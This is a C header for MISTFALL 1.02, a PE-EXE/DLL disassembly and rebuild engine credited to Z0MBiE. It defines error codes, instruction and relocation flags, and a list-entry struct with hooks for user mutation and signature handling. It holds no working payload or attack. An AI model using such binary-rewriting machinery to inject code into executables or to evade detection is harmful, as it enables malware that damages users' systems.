
////////x///////x///////x///////x///////x///////x///////x///////x///////x////
//                                                                         //
//       MISTFALL    PE-EXE/DLL reversing engine   (x) 2000 Z0MBiE         //
//                                                                         //
////////x///////x///////x///////x///////x///////x///////x///////x///////x////

#define MISTFALL_VERSION "1.02"

////////x///////x///////x///////x///////x///////x///////x///////x///////x////

#define ERR_SUCCESS     0               // engine() exit codes
#define ERR_BADFILE     1               // unsupported file format
#define ERR_SHORTSUX    2               // cant expand some short-jmp
#define ERR_NOMEMORY    3               // not enough memory
#define ERR_DISASM      4               // error while disasm
#define ERR_MUTATE      5               // user_mutate() returns error
#define ERR_SIGMAN      6               // user_sigman() returns error

////////x///////x///////x///////x///////x///////x///////x///////x///////x////

#define FL_RVA            0x00000001    // memd[i] - imagebase
#define FL_DELTA          0x00000002    // arg2[i] - arg1[i]
#define FL_FIXUP          0x00000004    // abs offset, with fixup
#define FL_LABEL          0x00000008    // label
#define FL_OPCODE         0x00000010    // opcode (1st byte of instruction)
#define FL_CODE           0x00000020    // code (any byte of instruction)
#define FL_HAVEREL        0x00000040    // have relative argument
#define FL_CREF           0x00000080    // code-reference
#define FL_DREF           0x00000100    // data-reference
#define FL_NEXT           0x00000200    // ...used temporary...
#define FL_ANALYZED       0x00000400    // ...used temporary...
#define FL_SECTALIGN      0x00000800    // new section
#define FL_PHYS           0x00001000    // FL_RVA/FL_DELTA modifier, use offs instead of rva
#define FL_PRESENT        0x00002000    // physically present
#define FL_VPRESENT       0x00004000    // virtually present
#define FL_FORCEOBJALIGN  0x00008000    // used for sizeofcode & sizeofidata
#define FL_FORCEFILEALIGN 0x00010000    // used for section[i].physsize
#define FL_DATA           0x00020000    // block of any data
#define FL_STOP           0x00040000    // JMP/RET-alike
#define FL_SIGNATURE      0x00080000    // should be set by sigman()
#define FL_USER1          0x10000000    // to be used by mutate()
#define FL_USER2          0x20000000
#define FL_USER3          0x40000000
#define FL_RES8           0x80000000    // high bit set, ==0x80000000

////////x///////x///////x///////x///////x///////x///////x///////x///////x////

#pragma pack(push)
#pragma pack(1)

struct hooy                             // list entry structure
{
  DWORD     flags;          // FL_xxx
  DWORD     oldrva;         // original RVA
  DWORD     newrva;         // unused while mutate()
  DWORD     newofs;         // unused while mutate()
  DWORD     datalen;        // data length (0 if no data)
  BYTE*     dataptr;        // ptr to data (NULL if no data)
  DWORD     arg1;           // used with FL_RVA, FL_FIXUP & FL_DELTA
  DWORD     arg2;           // used with FL_DELTA
  hooy*     next;           // ptr to next entry or NULL (end of list)
  //hooy* base, (== start_of_subroutine)
}; // hooy

#pragma pack(pop)

////////x///////x///////x///////x///////x///////x///////x///////x///////x////
